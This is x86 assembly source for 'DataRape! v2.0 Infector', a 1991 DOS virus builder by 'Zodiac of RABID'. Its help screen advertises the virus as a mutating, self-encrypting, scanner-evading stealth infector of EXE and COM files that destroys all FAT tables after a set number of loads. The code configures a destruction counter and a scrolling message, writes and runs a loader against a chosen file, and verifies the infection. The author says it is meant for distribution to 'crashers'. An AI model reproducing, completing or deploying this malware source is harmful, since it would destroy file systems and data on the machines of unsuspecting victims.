; DataRape! v2.0 Infector
;
; I know you won't dist this, DD.  Sorry its a bit sloppy, but it works.
;
;                       - Zodiac (06/26/91)


print         macro
              call      prints
              endm

cls           macro
              call      clrscr
              endm

code          segment
              assume    cs:code, ds:code
              org       100h

start:        jmp       main_menu

include       loader.inc

main_menu_str db        "DataRape! v2.0 Infector",13,10
              db        "(c)1991 Zodiac of RABID",13,10
              db        13,10
              db        "A. Information/Help",13,10
              db        "B. Configure Virus",13,10
              db        "C. View Scrolling",13,10
              db        "D. Infect File",13,10
              db        "E. Exit to Dos",13,10
              db        13,10
              db        "Command: $"

help_scr      db        "                 DataRape! v2.0 Information/Help",13,10
              db        13,10
              db        "DataRape! v2.0 is a mutating self-encrypting destructive stealth",13,10
              db        "EXE/COM infector.  It infects files upon execution, browsing,",13,10
              db        "copying, and renaming.  The encryption method changes randomly as",13,10
              db        "does the encryption header.  The virus should not be picked-up by",13,10
              db        "conventional string scanners(ie SCAN).  If so, it will be changed.",13,10
              db        "After a specified number of successful loads to memory, the virus",13,10
              db        "turns destructive and destroys all available FAT tables.  It then",13,10
              db        "proceeds to display a configurable scrolling message in",13,10
              db        "configurable colors.",13,10
              db        13,10
              db        "This infection program is self-explanatory, and is intended for",13,10
              db        "general distribution to RABID's selected crashers.  This virus has",13,10
              db        "taken many, many hours away from my life.  But, it was a pleasure",13,10
              db        "programming and a new version will be released(shortly?).",13,10
              db        13,10
              db        "Good Luck! Try not to get busted( trust me, it stinks. ).",13,10
              db        13,10
              db        '"Fear the Government that Fears Your Computer!"',13,10
              db        13,10
              db        "                                        -- Zodiac of RABID, USA",13,10
              db        13,10
              db        "P.S. I wrote this infector in assembly, can't you tell?$",13,10

config_scr    db        "DataRape! v2.0 Configuration",13,10
              db        13,10
              db        "Loads before Destruction(20 recommended) : "
              db        "$"
config_2      db        13,10
              db        13,10
              db        "Note: Press spacebar a few times at beginning or end of message.",13,10
              db        13,10
              db        "Enter Scrolling Message: $"
config_3      db        'Enter Colors in form: "bf", where "b" is the background and "f" the foreground.',13,10
              db        '                    ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿',13,10
              db        'Colors:             ³ FOREGROUND ONLY ³',13,10
              db        '                    ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿³ ÚÄÄÄÄ',13,10
              db        '0 : black            4 : red         ³³ ³ 8 : light grey       C : light red',13,10
              db        '1 : blue             5 : magenta     ³ÀÄ´ 9 : light blue       D : light magenta'
              db        '2 : green            6 : brown       ÀÄÄ´ A : light greenta    E : yellow',13,10
              db        '3 : cyan             7 : white          ³ B : light cyan       F : bright white',13,10
              db        '                                        ÀÄÄÄÄ',13,10
              db        13,10
              db        'Background Color : $'
config_4      db        13,10
              db        'Border     Color : $'
config_5      db        13,10
              db        'Scroll     Color : $'

color_s       db        "bf",8,8,"$"

infect_1      db        "DataRape! v2.0 Infection",13,10
              db        13,10
              db        "Finally...",13,10
              db        13,10
              db        "It would be a good idea to View Scrolling before you infect a file",13,10
              db        "to make sure you set up the colors right and the message is OK.",13,10
              db        13,10
              db        "Who else but RABID would allow configurable colors? ",13,10
              db        13,10
              db        "File to Infect : $"

infect_2      db        13,10
              db        13,10
              db        "An attempt will be made to infect the selected file.",13,10
              db        "If the file does not exist, or does not qualify for",13,10
              db        "infection, it will not be.  It is up to you to find",13,10
              db        "out whether it worked or not.  Remember, only COM and",13,10
              db        "EXE files that are over 1885 bytes are infected.$"

infect_3      db        13,10
              db        13,10
              db        "File Infection Successful.  RABID - Keeping the Dream Alive!$"

infect_4      db        13,10
              db        13,10
              db        "File Infection Unsuccessful!$"

infect_5      db        13,10
              db        13,10
              db        "File Not Found$"

clrscr:       mov       ax,0003
              int       10h
              ret

prints:       mov       ah,9
              int       21h
              ret

get_key:      mov       ah,8
              int       21h
              ret

get_up_key:   call      get_key
              cmp       al,"a"
              jb        got_up
              cmp       al,"z"
              ja        got_up
              sub       al,"a"-"A"
got_up:       ret

get_num:      call      get_key
              cmp       al,27
              je        got_num
              cmp       al,"0"
              jb        get_num
              cmp       al,"9"
              ja        get_num
got_num:      ret

nl:           mov       ah,0Eh
              mov       al,13
              int       10h
              mov       al,10
              int       10h
              ret

main_menu:    cls

              mov       dx,offset main_menu_str
              print

main_key:     call      get_up_key

              cmp       al,"A"
              je        info_help

              cmp       al,"B"
              je        config
              cmp       al,"C"
              jne       is_it_d
              jmp       view_scroll
is_it_d:      cmp       al,"D"
              jne       isitexit
              jmp       infectfile
isitexit:     cmp       al,"E"
              je        exit
              cmp       al,27
              je        exit

              jmp       main_key

exit:         jmp       done

info_help:    cls
              mov       dx,offset help_scr
              print
              call      get_key

info_done:    jmp       main_menu

config:       cls
              mov       dx,offset config_scr
              print
              mov       cx,2
get_freq:     call      get_num
              cmp       al,27
              je        info_done
              mov       ah,0Eh
              int       10h
              sub       al,"0"
              push      ax
              loop      get_freq
              pop       bx
              pop       ax
              mov       cl,10
              mul       cl
              add       al,bl
              cmp       al,2
              jb        info_done
              mov       countr,al

              mov       di,offset msg
              mov       al,0
              mov       cx,216
              rep       stosb
              mov       ah,9
              mov       dx,offset config_2
              int       21h
              xor       bx,bx
              mov       ax,0AFAh
              mov       cx,215
              int       10h
              mov       ah,2
              mov       dx,0619h
              int       10h
              mov       si,offset msg
              mov       di,si
              mov       bp,0
get_char_loop:call      get_key
              cmp       al,27
              je        done_config
              cmp       al,13
              je        done_get
              cmp       al,08
              jne       no_back
              cmp       bp,0
              je        get_char_loop
              mov       ah,3
              int       10h ; GETS INFO
              dec       bp
              dec       di
              cmp       dl,0
              jne       no_new_line
              dec       dh
              mov       dl,80
no_new_line:  dec       dl
              mov       ah,2
              int       10h
              mov       ah,0Ah
              mov       al,250
              mov       cx,1
              int       10h
              jmp       get_char_loop
no_bacK:      stosb
              inc       bp
              mov       ah,0Eh
              int       10h
              cmp       bp,215
              je        done_get
              jmp       get_char_loop

done_get:     mov       al,0
              stosb
              mov       ah,2
              mov       dx,0A00h
              int       10h
              mov       dx,offset config_3
              print
              mov       si,offset back_round + 1
              call      get_clr
              mov       dx,offset config_4
              print
              mov       si,offset bord_clr + 1
              call      get_clr
              mov       dx,offset config_5
              print
              mov       si,offset scroll_clr + 1
              call      get_clr


done_config:  jmp       main_menu
pop_done:     pop       ax
              jmp       main_menu
get_clr:      mov       dx,offset color_s
              print
get_color:    call      get_key
              cmp       al,27
              je        done_config
              cmp       al,"0"
              jb        get_color
              cmp       al,"7"
              ja        get_color
              mov       ah,0Eh
              int       10h
              sub       al,"0"
              push      ax
get_color_2:  call      get_up_key
              cmp       al,27
              je        pop_done
              cmp       al,"0"
              jb        get_color_2
              cmp       al,"9"
              ja        maybe_char
              mov       ah,0Eh
              int       10h
              sub       al,"0"
              jmp       short ok_clr_2
maybe_char:   cmp       al,"A"
              jb        get_color_2
              cmp       al,"F"
              ja        get_color_2
              mov       ah,0Eh
              int       10h
              sub       al,"A"-10
ok_clr_2:     pop       cx
              push      ax
              xor       ax,ax
              mov       al,cl
              mov       cl,4
              shl       al,cl
              pop       cx
              add       al,cl
              mov       [si],al
              ret

view_scroll:

;************************

nuke:         call      rel
rel:          pop       di
              sub       di,offset rel - offset nuke

              push      cs
              pop       ds

              mov       ax,1
              int       10h     ; 40 * 40 COLOR

              mov       ah,1
              mov       cx,2020h
              int       10h     ; NULS CURSOR

              mov       ax,0600h
              xor       cx,cx
              mov       dx,184Fh
back_round:   mov       bh,12
              int       10h     ; CLEARS BACKGROUND WINDOW

              mov       cx,0900h
              mov       dx,094Fh
scroll_clr:   mov       bh,4Fh
              int       10h     ; CLEARS MESSAGE WINDOW

              xor       bx,bx
              mov       dx,0800h
              mov       ah,2
              int       10h

bord_clr:     mov       bx,02h ; clr
              mov       cx,40
              mov       ax,09C4h
              push      ax
              push      bx
              push      cx
              int       10h

              mov       dx,0A00h
              mov       ah,2
              int       10h
              pop       cx
              pop       bx
              pop       ax
              int       10h

              mov       dx,030Ch
              mov       si,di
              add       si,offset header-offset nuke
              mov       cx,4
head_print:   mov       ah,2
              int       10h
xy_loop:      lodsb
              mov       ah,0Eh
              int       10h
              cmp       al,0
              jne       xy_loop
              inc       dh
              loop      head_print


              mov       bp,39
scroll:       mov       dx,0900h
              call      xy
              cmp       bp,1
              jb        no_pad

              mov       cx,bp
              mov       ax,0A20h
              int       10h
              add       dx,cx
              call      xy

              mov       cx,40
              sub       cx,bp
              dec       bp
              mov       si,offset msg-offset nuke
              add       si,di

              jmp       short sprint
no_pad:       mov       cx,40
              inc       si
              cmp       byte ptr [si],0
              jne       sprint
              mov       si,offset msg-offset nuke
              add       si,di
sprint:       push      si
              call      prnt
              pop       si
              jmp       short scroll

prnt:
              lodsb
              cmp       al,0
              jne       pchar
              mov       si,offset msg-offset nuke
              add       si,di
              jmp       short prnt

pchar:        mov       ah,0Eh
              int       10h
              mov       ah,1
              int       16h
              jc        go_main_menu
              loop      prnt
              mov       cx,6
main_pause:   push      cx
              mov       cx,0FFFFh
pause:        loop      pause
              pop       cx
              loop      main_pause
done_pause:   ret

go_main_menu: pop       ax
              jmp       main_menu


xy:           mov       ah,2
              int       10h
              ret
header        db        "DataRape! v2.0",0
              db        "-CONFIGURABLE-",0
              db        "(c)1991 Zodiac",0
              db        "  RABID, USA  ",0

go_ret_infect:jmp       main_menu

infectfile:   cls
              mov       dx,offset infect_1
              print
              mov       ah,0Ah
              mov       dx,offset file_in
              int       21h
              cmp       chars,4
              jb        go_ret_infect
              mov       cx,61
              mov       di,offset file_name
              mov       al,13
              repne     scasb
              mov       byte ptr [di-1],0

              mov       ah,4Eh
              mov       cx,0
              mov       dx,offset file_name
              int       21h
              jnc       file_found
              jmp       bad_file

file_found:

              mov       ah,41h
              mov       dx,offset loader
              int       21h


; prepare loader
              mov       si,offset file_name
              xor       cx,cx
              mov       cl,chars
              mov       di,offset datarape+56
              rep       movsb

              mov       si,offset msg
              mov       di,offset dr_msg
              mov       cx,215
              rep       movsb

              mov       ah,byte ptr [back_round+1]
              mov       al,byte ptr [scroll_clr+1]
              mov       bl,byte ptr [bord_clr+1]

              mov       backclr,ah
              mov       scrclr,al
              mov       bordclr,bl

              mov       ah,3Ch
              mov       cx,0
              mov       dx,offset loader
              int       21h                     ; creates it
              jc        go_ret_infect

              mov       bx,ax
              mov       ah,40h
              mov       cx,loadsize
              mov       dx,offset datarape
              int       21h                     ; writes it

              mov       ah,3Eh
              int       21h                     ; closes it

              call      kill_cntr

              mov       bx,(code_done-start+110h)/16
              mov       ah,4Ah
              int       21h

              mov       dx,offset loader
              mov       bx,offset loader
              mov       ax,4B00h
              int       21h             ; exec file

              call      kill_cntr

              mov       ah,41h
              mov       dx,offset loader
              int       21h             ; kills loader


              mov       ax,3D00h
              mov       dx,offset file_name
              int       21h

              mov       bx,ax

              mov       ax,5700h
              int       21h

              mov       ah,3Eh
              int       21h

             and        cx,1Fh
             cmp        cx,1Fh
             jne        bad_infect

             mov        dx,offset infect_3
             print
             jmp        short get_char

bad_infect:   mov       dx,offset infect_4
              print
              jmp       short get_char

bad_file:     mov       dx,offset infect_5
              print
get_char:     call      get_key

ret_infect:   jmp       main_menu
kill_cntr:    mov        ah,19h
              int        21h
              add        al,"A"
              mov        byte ptr [offset nasty],al

              mov        dx,offset nasty
              mov        ax,4301h
              xor        cx,cx
              int        21h                    ; NULS ATTRIBUTES


              mov        ah,41h
              int        21h                    ; Deletes Counter File
              ret


done:         cls
              int       20h

nasty         db        "A:\",0FFh,0FFh,0FFh,".",0FFh,0FFh,0
badfile       db        "Bad File...$"
loader        db        "LOADER.COM",0
file_in       db        60
chars         db        0
file_name     db        60 dup(0)
msg           db        "RABID, INTERNATIONAL - Keeping the Dream Alive.  (YOUR NAME HERE!)"

code_done     equ       $
code          ends
              end       start

